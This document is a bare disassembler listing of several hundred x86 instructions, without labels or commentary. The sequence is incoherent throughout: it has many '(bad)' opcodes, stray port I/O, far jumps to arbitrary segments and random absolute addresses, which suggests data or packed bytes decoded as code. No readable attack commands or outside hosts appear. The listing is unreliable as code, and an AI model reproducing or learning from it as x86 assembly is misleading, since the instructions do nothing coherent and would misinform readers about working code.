  433b7b:	lods   al,BYTE PTR ds:[esi]
  433b7c:	mov    edx,0x89a19f91
  433b81:	push   edx
  433b82:	mov    ds:0xb74cfccb,al
  433b87:	xchg   ebx,eax
  433b88:	dec    esp
  433b89:	test   eax,0xc15ec125
  433b8e:	aad    0xb7
  433b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b91:	int    0xf
  433b93:	mov    eax,ds:0xab0d825d
  433b98:	fstp   QWORD PTR [eax+0x1314a40]
  433b9e:	out    0xa0,al
  433ba0:	fld    DWORD PTR [ebp+0x29]
  433ba3:	fdiv   QWORD PTR [ebx-0x4d5e95fe]
  433ba9:	jp     0x433bef
  433bab:	xor    eax,0x1df60a54
  433bb0:	pop    esi
  433bb1:	lea    ebp,[edx+0x4b2f4629]
  433bb7:	adc    al,0xdd
  433bb9:	mov    bl,0x32
  433bbb:	loope  0x433b6f
  433bbd:	pusha  
  433bbe:	outs   dx,DWORD PTR ds:[esi]
  433bbf:	mov    ds:0xd9ccb59,eax
  433bc4:	dec    esp
  433bc5:	add    bh,ch
  433bc7:	mov    edx,0x4f2283ef
  433bcc:	mov    dh,0x6a
  433bce:	mov    eax,0x4c6803a2
  433bd3:	int3   
  433bd4:	pop    esp
  433bd5:	ins    DWORD PTR es:[edi],dx
  433bd6:	dec    esi
  433bd7:	push   DWORD PTR [edx+edx*1+0x60]
  433bdb:	inc    edi
  433bdc:	pop    esi
  433bdd:	ja     0x433bac
  433bdf:	inc    esp
  433be0:	xchg   esi,eax
  433be1:	cmp    ch,bl
  433be3:	mov    edi,0x924e6088
  433be8:	sbb    ecx,esi
  433bea:	xchg   ebx,eax
  433beb:	mov    ds:0x42ee491d,eax
  433bf0:	mov    eax,ds:0x81f436fa
  433bf5:	shl    BYTE PTR [edi],cl
  433bf7:	jns    0x433c00
  433bf9:	imul   ecx,DWORD PTR [edx+edx*4],0xaa4ed95e
  433c00:	inc    esi
  433c01:	mov    dh,0x88
  433c03:	fs pop edi
  433c05:	cmp    BYTE PTR [edi-0x13],ch
  433c08:	aas    
  433c09:	aas    
  433c0a:	mov    al,ds:0xc13a9e2d
  433c0f:	fbld   TBYTE PTR ss:[edx-0x2d]
  433c13:	repnz fidiv WORD PTR [ebx+ebx*1+0x17]
  433c18:	retf   
  433c19:	dec    ecx
  433c1a:	sub    BYTE PTR [esp+ecx*2+0x5cece50a],ch
  433c21:	pop    esi
  433c22:	mov    al,ds:0x74d6e91
  433c27:	xor    ch,cl
  433c29:	pusha  
  433c2a:	or     BYTE PTR [eax],ch
  433c2c:	cmp    DWORD PTR [ecx],esp
  433c2e:	mov    al,0xef
  433c30:	push   0x21277aa5
  433c35:	mov    edx,0x4fde7902
  433c3a:	imul   esp,DWORD PTR [ebx+0x54],0xefa0f473
  433c41:	add    esi,DWORD PTR [edi+0x36]
  433c44:	push   cs
  433c45:	imul   DWORD PTR [esi+0x71443800]
  433c4b:	and    DWORD PTR [eax],ebx
  433c4d:	cli    
  433c4e:	outs   dx,BYTE PTR ds:[esi]
  433c4f:	xor    al,0xb5
  433c51:	pop    es
  433c52:	and    ah,BYTE PTR [ecx-0x734eeb2c]
  433c58:	sbb    esi,ecx
  433c5a:	push   ds
  433c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433c5c:	idiv   BYTE PTR [ebp+0x6e8824d8]
  433c62:	push   ds
  433c63:	je     0x433cd5
  433c65:	clc    
  433c66:	push   edi
  433c67:	stos   BYTE PTR es:[edi],al
  433c68:	pop    esp
  433c69:	popa   
  433c6a:	push   cs
  433c6b:	sbb    DWORD PTR [edx-0x6b552b84],esi
  433c71:	retf   
  433c72:	out    dx,al
  433c73:	xlat   BYTE PTR ds:[ebx]
  433c74:	pop    es
  433c75:	pop    esp
  433c76:	inc    ecx
  433c77:	jg     0x433c5e
  433c79:	xchg   esp,eax
  433c7a:	(bad)  
  433c7b:	mov    eax,ds:0xb0433a65
  433c80:	mov    ds:0xf36b0fed,eax
  433c85:	(bad)  
  433c86:	in     al,0xf0
  433c88:	pop    ebp
  433c89:	xchg   esi,eax
  433c8a:	rol    DWORD PTR [eax],cl
  433c8c:	test   al,0x77
  433c8e:	aaa    
  433c8f:	xchg   ebx,eax
  433c90:	mov    al,BYTE PTR [esi+0x5a]
  433c93:	mov    eax,ds:0x6dcd43af
  433c98:	mov    edx,0x5e1e4b67
  433c9d:	in     eax,dx
  433c9e:	or     ah,bl
  433ca0:	cmp    DWORD PTR [esi],edx
  433ca2:	xor    ah,BYTE PTR [eax+0x25af62f5]
  433ca8:	fucomip st,st(5)
  433caa:	inc    ebp
  433cab:	out    dx,al
  433cac:	ret    
  433cad:	inc    ebp
  433cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433caf:	fisttp DWORD PTR [ecx-0x6f]
  433cb2:	inc    eax
  433cb3:	and    eax,0x280073ef
  433cb8:	sar    BYTE PTR [ebp+0x261fed6e],cl
  433cbe:	popa   
  433cbf:	(bad)  
  433cc1:	pusha  
  433cc2:	mov    ebp,0xc81956fc
  433cc7:	sub    ebx,DWORD PTR [ebx]
  433cc9:	add    esi,0xffffff9e
  433ccc:	cmp    eax,DWORD PTR [edx-0x4d]
  433ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433cd0:	push   ds
  433cd1:	fcomp  DWORD PTR [edi+edx*2+0x2a]
  433cd5:	daa    
  433cd6:	jb     0x433c79
  433cd8:	ficom  WORD PTR [esi-0x65]
  433cdb:	(bad)  
  433cdd:	or     eax,0x775e4e06
  433ce2:	fnstcw WORD PTR [eax+0x5]
  433ce5:	or     eax,0x6151bfd3
  433cea:	push   ecx
  433ceb:	sub    ebx,DWORD PTR [ebx+0x2e7fb0d5]
  433cf1:	cwde   
  433cf2:	hlt    
  433cf3:	lods   eax,DWORD PTR ds:[esi]
  433cf4:	jg     0x433d31
  433cf6:	pop    edi
  433cf7:	ds pop esi
  433cf9:	and    ch,BYTE PTR [ebp+0x47a350ba]
  433cff:	or     BYTE PTR [ecx+edi*8],ch
  433d02:	adc    DWORD PTR [ecx-0x31bc7f33],esp
  433d08:	pop    esi
  433d09:	fwait
  433d0a:	mov    edx,0x3e2309d3
  433d0f:	fisttp DWORD PTR [ebx+0x64]
  433d12:	pushf  
  433d13:	push   ds
  433d14:	pop    ebx
  433d15:	mov    al,ds:0xefc49dae
  433d1a:	stos   BYTE PTR es:[edi],al
  433d1b:	je     0x433d15
  433d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433d1e:	xchg   esi,eax
  433d1f:	push   cs
  433d20:	pop    esi
  433d21:	jmp    0x433ca6
  433d23:	repnz mov ds,WORD PTR [eax]
  433d26:	pop    ss
  433d27:	dec    ebp
  433d28:	outs   dx,BYTE PTR ds:[esi]
  433d29:	mov    bl,0x62
  433d2b:	dec    eax
  433d2c:	pop    ecx
  433d2d:	mov    cl,0xeb
  433d2f:	push   0x654f60e6
  433d34:	icebp  
  433d35:	repz push ecx
  433d37:	jns    0x433cea
  433d39:	xor    dh,ch
  433d3b:	cmp    BYTE PTR [bx+si-0x45],0xff
  433d40:	mov    bl,0xf0
  433d42:	add    BYTE PTR [ecx-0x12c5f906],ah
  433d48:	in     eax,0xba
  433d4a:	xchg   esi,eax
  433d4b:	das    
  433d4c:	pop    esi
  433d4d:	sbb    al,0xc1
  433d4f:	repz loopne 0x433da7
  433d52:	or     eax,0x344365c1
  433d57:	xor    eax,0x4af199c2
  433d5c:	and    ecx,esp
  433d5e:	loope  0x433d73
  433d60:	sti    
  433d61:	lea    ecx,[edx-0x1]
  433d64:	pop    esi
  433d65:	adc    BYTE PTR [ecx],ah
  433d67:	jb     0x433d78
  433d69:	jecxz  0x433db9
  433d6b:	mov    dh,0x30
  433d6d:	popa   
  433d6e:	jecxz  0x433d0d
  433d70:	rcr    DWORD PTR [edi+0x4b],0x5b
  433d74:	shl    DWORD PTR [esi],cl
  433d76:	fs xchg edi,eax
  433d78:	pop    esi
  433d79:	sub    edx,eax
  433d7b:	xchg   esp,eax
  433d7c:	or     edi,esi
  433d7e:	sub    ah,BYTE PTR [ebp-0x5f21d2e5]
  433d84:	sub    BYTE PTR [ecx],bl
  433d86:	fld    QWORD PTR [edi]
  433d88:	jo     0x433d88
  433d8a:	xor    esi,edi
  433d8c:	jmp    0x57ba:0x40afee37
  433d93:	jnp    0x433de5
  433d95:	mov    esi,0x4b19a149
  433d9a:	fist   WORD PTR [ecx]
  433d9c:	ins    DWORD PTR es:[edi],dx
  433d9d:	push   eax
  433d9e:	adc    BYTE PTR [ebx+0x1c17745e],ah
  433da4:	in     eax,dx
  433da5:	sar    DWORD PTR [edi+ebp*1],1
  433da8:	push   edi
  433da9:	pusha  
  433daa:	mov    ds:0xe1cc293e,al
  433daf:	dec    ebx
  433db0:	xchg   esp,eax
  433db1:	jo     0x433e12
  433db3:	test   DWORD PTR [esi+0x4],ebx
  433db6:	psubw  mm0,QWORD PTR [eax]
  433db9:	rol    dh,0x85
  433dbc:	outs   dx,DWORD PTR ds:[esi]
  433dbd:	pusha  
  433dbe:	mov    DWORD PTR [eax-0x47b9814d],esp
  433dc4:	(bad)  
  433dc5:	mov    cl,0x8e
  433dc7:	js     0x433dd5
  433dc9:	xor    edi,esp
  433dcb:	idiv   BYTE PTR [edx-0x29]
  433dce:	lods   eax,DWORD PTR ds:[esi]
  433dcf:	mov    al,0x4e
  433dd1:	std    
  433dd2:	sub    eax,0xb5615bfb
  433dd7:	push   ebp
  433dd8:	adc    edi,DWORD PTR [eax-0x6f]
  433ddb:	stos   BYTE PTR es:[edi],al
  433ddc:	imul   ebx,esp,0xffffffef
  433ddf:	sub    DWORD PTR [eax],ebx
  433de1:	leave  
  433de2:	leave  
  433de3:	add    BYTE PTR [ebp+0x797d05ae],cl
  433de9:	pusha  
  433dea:	push   ecx
  433deb:	pop    esi
  433dec:	add    esp,DWORD PTR [ebx]
  433dee:	pop    edi
  433def:	and    al,0x70
  433df2:	in     al,0xdb
  433df4:	push   esp
  433df5:	cmc    
  433df6:	mov    ecx,0x788a1ee1
  433dfb:	sub    al,0x87
  433dfd:	nop
  433dfe:	arpl   WORD PTR [eax-0x10bab12a],sp
  433e04:	fsubrp st(1),st
  433e06:	pop    eax
  433e07:	dec    eax
  433e08:	jbe    0x433d8e
  433e0a:	(bad)  
  433e0c:	arpl   WORD PTR [edi+ecx*8+0x73214331],bx
  433e13:	ss mov ch,0xb
  433e16:	daa    
  433e17:	mov    eax,ds:0x957dc2b2
  433e1c:	movntps XMMWORD PTR [ebx+edx*4+0x5b12ca5e],xmm2
  433e24:	cld    
  433e25:	dec    edi
  433e26:	scas   al,BYTE PTR es:[edi]
  433e27:	das    
  433e28:	imul   edx,DWORD PTR [edx-0x1e],0x3c
  433e2c:	dec    esp
  433e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433e2e:	mov    DWORD PTR es:[esi],eax
  433e31:	push   edx
  433e32:	out    dx,al
  433e33:	cld    
  433e34:	xchg   ecx,eax
  433e35:	jmp    0xa0da:0xda90057f
  433e3c:	imul   ebp,ebx,0x98b80102
  433e42:	add    ebp,ebx
  433e44:	pop    ebx
  433e45:	out    dx,al
  433e46:	hlt    
  433e47:	fucomi st,st(5)
  433e49:	xchg   ecx,eax
  433e4a:	push   ds
  433e4b:	arpl   WORD PTR [ecx],sp
  433e4d:	xor    bl,al
  433e4f:	mov    al,ds:0xe10a1093
  433e54:	inc    ebx
  433e55:	cmp    eax,0xf6517f19
  433e5a:	popa   
  433e5b:	push   0xe4669e5e
  433e60:	xlat   BYTE PTR ds:[ebx]
  433e61:	call   0xd8b3df72
  433e66:	push   esp
  433e67:	or     ebp,DWORD PTR [edi+ecx*2-0x31a1e7f9]
  433e6e:	push   ds
  433e6f:	(bad)  
  433e70:	std    
  433e71:	xchg   ebx,eax
  433e72:	jmp    0x433e02
  433e74:	out    0x60,eax
  433e76:	cmp    eax,esp
  433e78:	test   al,0x7d
  433e7a:	mov    eax,ds:0xeed0e62d
  433e7f:	xchg   ebp,eax
  433e80:	push   ebp
  433e81:	(bad)  
  433e82:	(bad)  
  433e83:	adc    eax,DWORD PTR [esi-0x65]
  433e86:	data16 test al,0x1a
  433e89:	(bad)  
  433e8a:	sub    eax,0x5da0bee3
  433e8f:	adc    esi,DWORD PTR [eax+0x10]
  433e92:	pop    ecx
  433e93:	push   ecx
  433e94:	xchg   edx,eax
  433e95:	ret    0xb2ee
  433e98:	in     al,0x6a
  433e9a:	push   0xea5fcfe4
  433e9f:	mov    al,ds:0x3449b9c3
  433ea4:	call   0x5f061dc0
  433ea9:	xchg   edi,eax
  433eaa:	imul   BYTE PTR [esi+eax*2]
  433ead:	leave  
  433eae:	push   esi
  433eaf:	and    eax,0xd3b6155
  433eb4:	fwait
  433eb5:	cmp    al,0x5b
  433eb7:	mov    BYTE PTR [ebx+eiz*8],bh
  433eba:	out    dx,al
  433ebb:	les    edx,FWORD PTR [edx+0xc]
  433ebe:	call   ecx
  433ec0:	and    eax,0x548fedf7
  433ec5:	jb     0x433f3f
  433ec7:	and    ecx,esp
  433ec9:	aaa    
  433eca:	dec    ecx
  433ecb:	sbb    esi,DWORD PTR [esp+eax*8]
  433ece:	out    dx,al
  433ecf:	aas    
  433ed0:	push   esi
  433ed1:	sub    bl,BYTE PTR [ebp+0x4314bf14]
  433ed7:	mov    eax,ds:0x9f1155ee
  433edc:	inc    eax
  433edd:	lods   eax,DWORD PTR ds:[esi]
  433ede:	mov    ebx,0x60c5e80
  433ee3:	ins    BYTE PTR es:[edi],dx
  433ee4:	xor    ebx,esi
  433ee6:	xchg   edi,eax
  433ee7:	xor    eax,0x650551bc
  433eec:	push   ds
  433eed:	inc    eax
  433eee:	ins    DWORD PTR es:[edi],dx
  433eef:	cmp    eax,0x494753cb
  433ef4:	cld    
  433ef5:	ret    
  433ef6:	out    dx,al
  433ef7:	adc    eax,DWORD PTR [ecx]
  433ef9:	xchg   esp,eax
  433efa:	xor    DWORD PTR [edx-0x5f4e44cd],0x23
  433f01:	dec    ebx
  433f02:	adc    esi,DWORD PTR [ecx+0x3e]
  433f05:	mov    cs,WORD PTR [esi-0x65]
  433f08:	addr16 rcr edx,cl
  433f0b:	call   0x53432046
  433f10:	mov    esi,DWORD PTR [ecx]
  433f12:	xchg   esi,eax
  433f13:	mov    cl,0x9b
  433f15:	dec    esi
  433f16:	add    al,BYTE PTR [eax-0x21]
  433f19:	es out dx,al
  433f1b:	sub    al,0x3d
  433f1d:	mov    WORD PTR [edx],es
  433f1f:	jae    0x433f21
  433f21:	adc    eax,0x13a193
  433f26:	in     al,0xa6
  433f28:	lods   al,BYTE PTR ds:[esi]
  433f29:	pop    esi
  433f2a:	jae    0x433ef2
  433f2c:	cmp    ch,BYTE PTR [esi+edi*8+0x17aa5e89]
  433f33:	adc    esi,DWORD PTR [edx]
  433f35:	jg     0x433f49
  433f37:	mov    fs,WORD PTR [esi]
  433f39:	adc    BYTE PTR [ebx+0x3d977e62],al
  433f3f:	rol    DWORD PTR [edx],0x8e
  433f42:	cs ret 0xb6f5
  433f46:	out    dx,al
  433f47:	fsub   QWORD PTR [ebx-0x6e5d8975]
  433f4d:	mov    ebx,0xe224a0f8
  433f52:	sbb    DWORD PTR [edx+ecx*8],edx
  433f55:	inc    ecx
  433f56:	cli    
  433f57:	(bad)  
  433f58:	adc    bl,BYTE PTR [edx+0x68e7a0d9]
  433f5e:	adc    DWORD PTR [ebx-0x7ac0494f],eax
  433f64:	xor    edx,DWORD PTR [edx-0x43]
  433f67:	hlt    
  433f68:	nop
  433f69:	jmp    0x433f18
  433f6b:	fisub  DWORD PTR [edx]
  433f6d:	jl     0x433fdf
  433f6f:	dec    esi
  433f70:	mov    WORD PTR [edx+0x32325ed3],cx
  433f77:	jge    0x433f0c
  433f79:	xor    esi,DWORD PTR [eax]
  433f7b:	jnp    0x433fce
  433f7d:	popa   
  433f7e:	push   eax
  433f7f:	sbb    eax,0x8ee53739
  433f84:	stos   BYTE PTR es:[edi],al
  433f85:	(bad)  
  433f86:	out    dx,al
  433f87:	int    0x65
  433f89:	xor    BYTE PTR [eax-0x52f12cc8],bh
  433f8f:	mov    al,ds:0x5cdb6dcf
  433f94:	mov    ah,0xca
  433f96:	or     eax,0x79a9563f
  433f9b:	cld    
  433f9c:	jp     0x433f3b
  433f9e:	lods   al,BYTE PTR es:[esi]
  433fa0:	mov    esi,0xb673ee10
  433fa5:	(bad)  
  433fa6:	add    eax,0xeeab0fa4
  433fab:	push   ebp
  433fac:	test   BYTE PTR [ecx],ch
  433fae:	mov    al,0x4b
  433fb0:	lds    ebp,FWORD PTR [esi]
  433fb2:	mov    ecx,0x866443a3
  433fb7:	adc    BYTE PTR [ebx-0x72],ch
  433fba:	lahf   
  433fbb:	sar    DWORD PTR [ecx],0xf5
  433fbe:	(bad)  
  433fbf:	dec    esi
  433fc0:	cmp    BYTE PTR [eax],dl
  433fc2:	mov    ax,ds:0x2d6bd385
  433fc8:	popf   
  433fc9:	pop    edx
  433fca:	shl    BYTE PTR [eax-0x3b1be04b],1
  433fd0:	retf   0x1cc6
  433fd3:	cmc    
  433fd4:	pop    esi
  433fd5:	mov    WORD PTR [ebp-0x65],cs
  433fd8:	push   cs
  433fd9:	loopne 0x433fd5
  433fdb:	and    ecx,DWORD PTR ds:0xcce38f79
  433fe1:	pop    ebx
  433fe2:	xor    BYTE PTR [edi],bh
  433fe4:	nop
  433fe5:	and    DWORD PTR [ecx+eiz*2],eax
  433fe8:	inc    ebp
  433fe9:	ss mov bl,0x73
  433fec:	pop    esi
  433fed:	lock or DWORD PTR [ebx+eax*1-0x7b82f77a],edx
  433ff5:	pop    ebp
  433ff6:	mov    edi,0x6ed5850d
  433ffb:	(bad)  
  433ffc:	mov    esi,0x5e632d95
  434001:	rcl    BYTE PTR [eax],0x96
  434004:	popa   
  434005:	jmp    0x605ffbc6
  43400a:	push   esi
  43400b:	jmp    0x214f:0x759271fc
  434012:	mov    ds:0xee8a320d,al
  434017:	pop    esp
  434018:	outs   dx,BYTE PTR ds:[esi]
  434019:	ins    DWORD PTR es:[edi],dx
  43401a:	mov    al,ds:0x564b7d3a
  43401f:	stos   BYTE PTR es:[edi],al
  434020:	cs pushf 
  434022:	outs   dx,BYTE PTR ds:[esi]
  434023:	sbb    ch,0x78
  434026:	xor    DWORD PTR [ebp+0x65],ebp
  434029:	iret   
  43402a:	out    dx,al
  43402b:	or     BYTE PTR [ebx+0xc],ah
  43402e:	retf   
  43402f:	nop
  434030:	jbe    0x434027
  434032:	das    
  434033:	mov    ds:0xf1afd0e8,al
  434038:	fistp  WORD PTR [edx]
  43403a:	inc    edx
  43403b:	repnz fs pushf 
  43403e:	test   BYTE PTR [edx+0x78],ah
  434041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434042:	arpl   bx,si
  434044:	pop    ebx
  434045:	cdq    
  434046:	pop    edx
  434047:	or     BYTE PTR [edx+0x18e2fd22],ah
  43404d:	adc    DWORD PTR [edx+0x78],ebx
  434050:	jne    0x4340b2
  434052:	inc    edi
  434053:	add    al,0x57
  434055:	and    BYTE PTR [edx-0x11b7a5db],al
  43405b:	stos   DWORD PTR es:[edi],eax
  43405c:	xor    eax,0xcdb14ed4
  434061:	xlat   BYTE PTR ds:[ebx]
  434062:	(bad)  
  434063:	mov    al,ds:0xe8f533c6
  434068:	ret    0xac3f
  43406b:	adc    ebx,DWORD PTR [esi+0x67]
  43406e:	cli    
  43406f:	pushf  
  434070:	jmp    0x434042
  434072:	pusha  
  434073:	ret    
  434074:	sbb    esp,DWORD PTR [ecx-0x7c]
  434077:	or     eax,0x818b00aa
  43407c:	mov    eax,ds:0xe560ee70
  434081:	test   ch,cl
  434083:	xor    eax,0x8f93f3ea
  434088:	sub    BYTE PTR [edx-0x5b5c5ee0],cl
  43408e:	xor    DWORD PTR [eax+0x1beee19d],eax
  434094:	xchg   edi,eax
  434095:	fidiv  DWORD PTR [ecx+0x7c]
  434098:	es adc al,0xf0
  43409b:	mov    al,ds:0xc9b02b0d
  4340a0:	mov    cl,0xec
  4340a2:	and    BYTE PTR [esi+0x5e],0x37
  4340a6:	retf   0x13a6
  4340a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4340aa:	xchg   edi,eax
  4340ab:	xor    edx,DWORD PTR [ebx-0x4802a3a0]
  4340b1:	dec    esi
  4340b2:	mov    al,0x13
  4340b4:	xor    al,0x34
  4340b6:	out    dx,al
  4340b7:	xchg   esp,eax
  4340b8:	xchg   esi,eax
  4340b9:	call   0xa889:0x7baa625e
  4340c0:	adc    eax,0x7baa8293
  4340c5:	shr    BYTE PTR [ebx-0x11a2ee89],1
  4340cb:	mov    dh,0x20
  4340cd:	mov    ch,0x2
  4340cf:	ret    
  4340d0:	add    eax,0x31a4638b
  4340d5:	xchg   esi,eax
  4340d6:	ss mov edx,0xdb56a1bc
  4340dc:	and    eax,0x6279ed4a
  4340e1:	loop   0x4340f2
  4340e3:	adc    DWORD PTR [ebx+0x5a036d5],eax
  4340e9:	popa   
  4340ea:	icebp  
  4340eb:	aam    0x45
  4340ed:	mov    ebp,0xcbee5944
  4340f2:	in     al,0xb1
  4340f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4340f5:	aam    0x23
  4340f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4340f8:	sbb    BYTE PTR [ebx-0x3aa57ea4],0x89
  4340ff:	lahf   
  434100:	pop    edi
  434101:	sbb    ecx,DWORD PTR [eax-0x44ed216f]
  434107:	inc    edi
  434108:	mov    ds,WORD PTR [edi+0x36b3c7ec]
  43410e:	mov    dh,0x85
  434110:	mul    eax
  434112:	jne    0x4340c6
  434114:	daa    
  434115:	ja     0x434110
  434117:	jp     0x43417c
  434119:	mov    ds:0xb8d7a871,eax
  43411e:	sbb    cl,ch
  434120:	pusha  
  434121:	adc    DWORD PTR [eax],esp
  434123:	fldenv [edi+0x5f4ae1f4]
  434129:	jnp    0x43418b
  43412b:	mov    dh,BYTE PTR [edx]
  43412d:	adc    BYTE PTR [ebp-0x2c019398],ch
  434133:	mov    ds:0xd0f9c2d6,al
  434138:	(bad)  
  434139:	jle    0x4340e9
  43413b:	je     0x434133
  43413d:	push   ebx
  43413e:	out    dx,al
  43413f:	pop    es
  434140:	fmul   DWORD PTR [ecx-0x2a]
  434143:	aad    0xa1
  434145:	push   ebp
  434146:	push   edx
  434147:	mov    eax,ds:0xb81ae5b6
  43414c:	sub    DWORD PTR [ebx],0x5a5e7257
  434152:	(bad)  
  434153:	push   esi
  434154:	jnp    0x43413c
  434156:	add    DWORD PTR cs:[ebx+0x219e664e],ebx
  43415d:	pop    esp
  43415e:	icebp  
  43415f:	fwait
  434160:	dec    eax
  434161:	mov    eax,ds:0xb0e69acf
  434166:	loop   0x43413a
  434168:	pop    esi
  434169:	fmul   DWORD PTR [esi-0x5e]
  43416c:	inc    ebx
  43416d:	cmp    ebp,DWORD PTR ds:0x4c188c3d
  434173:	lahf   
  434174:	pop    ebp
  434175:	(bad)  
  434176:	call   0x48591eae
  43417b:	icebp  
  43417c:	push   ebp
  43417d:	xchg   ebp,ebp
  43417f:	lock inc esi
  434181:	mov    al,0x43
  434183:	adc    dl,al
  434185:	pop    ecx
  434186:	bound  esp,QWORD PTR [edi]
  434188:	sub    eax,0xac5f6249
  43418d:	or     BYTE PTR [edx],0x26
  434190:	pop    esi
  434191:	rcl    BYTE PTR [edi-0x20e2bc49],0x4b
  434198:	stc    
  434199:	pop    ecx
  43419a:	rcr    ebp,1
  43419c:	int    0x6b
  43419e:	aaa    
  43419f:	xor    DWORD PTR [edi-0x76],0x535e7b08
  4341a6:	fs jbe 0x4341dc
  4341a9:	pop    edx
  4341aa:	pop    esp
  4341ab:	mov    esi,?
  4341ad:	pop    ecx
  4341ae:	mov    ebp,0xaa2e6b07
  4341b3:	lock push edx
  4341b5:	imul   esi,DWORD PTR [eax+0x7f725e96],0x27a4e07b
  4341bf:	inc    ebx
  4341c0:	lea    edx,[edx-0x32]
  4341c3:	cdq    
  4341c4:	bound  ebx,QWORD PTR [edx+ecx*4+0x79e0ddba]
  4341cb:	call   0xd3e14c56
  4341d0:	pop    esi
  4341d1:	sub    BYTE PTR [ecx+0x2f],bh
  4341d4:	sbb    eax,0x631af07e
  4341d9:	pusha  
  4341da:	out    0x2c,al
  4341dc:	push   cs
  4341dd:	sbb    edi,ebx
  4341df:	push   esi
  4341e0:	cli    
  4341e1:	xchg   esp,eax
  4341e2:	popf   
  4341e3:	in     al,0x44
  4341e5:	mov    ecx,0x995ef31b
  4341ea:	or     eax,0x74f4b4bf
  4341ef:	in     eax,dx
  4341f0:	cmp    esp,DWORD PTR [ecx-0x3f]
  4341f3:	mov    al,0x8
  4341f5:	cmp    esp,DWORD PTR [ebx+ebx*2+0x72edcfe9]
  4341fc:	fwait
  4341fd:	xor    al,0x36
  4341ff:	fisttp WORD PTR [esi-0x20e8c560]
  434205:	inc    ebx
  434206:	inc    ebx
  434207:	lea    ecx,[edi+0x61]
  43420a:	xor    eax,0x48f20c1b
  43420f:	pop    esi
  434210:	pop    ecx
  434211:	in     eax,dx
  434212:	les    esp,FWORD PTR [edi+ebx*2-0x3f]
  434216:	cs in  eax,0xf7
  434219:	jmp    0x3aff:0x20209edf
  434220:	pop    esi
  434221:	out    dx,eax
  434222:	pop    ecx
  434223:	(bad)  [ecx-0x1b]
  434226:	and    al,0x16
  434228:	fld    st(2)
  43422a:	stos   DWORD PTR es:[edi],eax
  43422b:	mov    bh,0xd1
  43422d:	mov    ebx,0xc59b16e
  434232:	clc    
  434233:	sti    
  434234:	mov    edi,0x8f29a760
  434239:	push   eax
  43423a:	mov    edx,0xeb95f142
  43423f:	mov    ?,ebp
  434241:	pop    esp
  434242:	ins    DWORD PTR es:[edi],dx
  434243:	inc    edi
  434244:	shl    eax,1
  434246:	push   esp
  434247:	fist   DWORD PTR [edx-0x261d86a1]
  43424d:	cmp    ebx,esp
  43424f:	xchg   eax,ebp
  434251:	shl    BYTE PTR [edi],0xb6
  434254:	pop    ebx
  434255:	sub    BYTE PTR [ebx+0xeb6b9d8],al
  43425b:	push   ebp
  43425c:	fmul   QWORD PTR [esi]
  43425e:	mov    ch,0xa0
  434260:	push   0xac2b0345
  434265:	pop    ebx
  434266:	push   ds
  434267:	xchg   esp,eax
  434268:	pop    esi
  434269:	add    al,0xc6
  43426b:	pushf  
  43426c:	push   eax
  43426d:	mov    edi,0x5d8aa1e4
  434272:	ins    BYTE PTR es:[edi],dx
  434273:	jle    0x434293
  434275:	xchg   edi,eax
  434276:	fwait
  434277:	dec    edi
  434278:	(bad)  
  434279:	mov    al,ds:0xd75e37b3
  43427e:	or     DWORD PTR [edx-0x12],0xffffff9e
  434282:	add    ah,BYTE PTR [ebp-0x5810bdb3]
  434288:	pusha  
  434289:	test   DWORD PTR [esi],eax
  43428b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43428c:	mov    ebp,0x7ee30da9
  434291:	adc    al,0x69
  434293:	push   esi
  434294:	pop    ebp
  434295:	sub    BYTE PTR [edi],0xe9
  434298:	(bad)  
  434299:	jne    0x434317
  43429b:	dec    esp
  43429c:	mov    ds,eax
  43429e:	or     BYTE PTR [ecx+0x6e52505f],ah
  4342a4:	and    edx,ebp
  4342a6:	jp     0x4342a3
  4342a8:	pop    esi
  4342a9:	mov    edx,0x6596eef5
  4342ae:	hlt    
  4342af:	(bad)  
  4342b0:	lods   eax,DWORD PTR ds:[esi]
  4342b1:	push   edx
  4342b2:	adc    cl,BYTE PTR [ebp-0x13]
  4342b5:	inc    edx
  4342b6:	outs   dx,BYTE PTR ds:[esi]
  4342b7:	or     dl,dh
  4342b9:	stc    
  4342ba:	int3   
  4342bb:	in     eax,0x86
  4342bd:	aad    0xe7
  4342bf:	fsubr  DWORD PTR [esp+edx*8]
  4342c2:	cmp    DWORD PTR ds:0xdd29a0be,eax
  4342c8:	mov    ebp,0xf0377760
  4342cd:	add    cl,BYTE PTR [esi-0x11798044]
  4342d3:	jg     0x434270
  4342d5:	test   DWORD PTR ds:0x1566ee8f,0x6d44cda1
  4342df:	push   ds
  4342e0:	mov    ds,WORD PTR [eax+0x57]
  4342e3:	rcr    BYTE PTR [esi-0x73],1
  4342e6:	pop    ebp
  4342e7:	cmp    al,0xaa
  4342e9:	in     al,0xb0
  4342eb:	loope  0x4342f0
  4342ed:	pop    eax
  4342ee:	mov    esi,0x67b4b313
  4342f3:	sbb    eax,DWORD PTR [edx]
  4342f5:	loope  0x4342c5
  4342f7:	xor    ch,BYTE PTR [ebx+0x1a]
  4342fa:	out    dx,al
  4342fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4342fc:	jae    0x434298
  4342fe:	mov    dh,0x17
  434300:	scas   al,BYTE PTR es:[edi]
  434301:	iret   
  434302:	and    DWORD PTR [eax-0x7b1957c],ebp
  434308:	dec    ebp
  434309:	shr    DWORD PTR [ebx+0x214ae038],0x3f
  434310:	add    BYTE PTR [eax-0x51],bl
  434313:	daa    
  434314:	dec    edx
  434315:	loope  0x434328
  434317:	in     al,dx
  434318:	outs   dx,BYTE PTR ds:[esi]
  434319:	addr16 repnz mov al,ds:0x5f71
  43431e:	fcomp  QWORD PTR [edx+0x7f]
  434321:	jne    0x434334
  434323:	jbe    0x434383
  434325:	in     eax,dx
  434326:	add    ebx,DWORD PTR [esi]
  434328:	repnz xchg edx,eax
  43432a:	in     eax,0xae
  43432c:	xchg   BYTE PTR [eax+0xd],ah
  43432f:	push   cs
  434330:	cmp    esp,ecx
  434332:	je     0x43437c
  434334:	popa   
